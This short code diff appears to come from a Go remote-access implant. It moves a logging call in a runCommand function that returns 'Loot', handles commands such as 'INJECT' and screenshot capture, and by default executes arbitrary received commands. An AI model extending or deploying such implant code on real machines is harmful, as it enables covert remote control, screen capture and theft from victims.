@@ -111,6 +111,8 @@ func readKeys(request http.Request) {
 }
 
 func runCommand(command []string) Loot {
+	slog.Info("Executing command: " + command[0])
+
 	var loot Loot
 	switch command[0] {
 	case "INJECT":
@@ -137,7 +139,6 @@ func runCommand(command []string) Loot {
 		// TODO: Send more than 1 screenshot for multiple monitor setups
 		loot.Content = screenshots[0]
 	default:
-		slog.Info("Executing command: " + command[0])
 		loot.Content = ExecuteCommand(command)
 		slog.Info("Output:\n" + loot.Content)
 	}
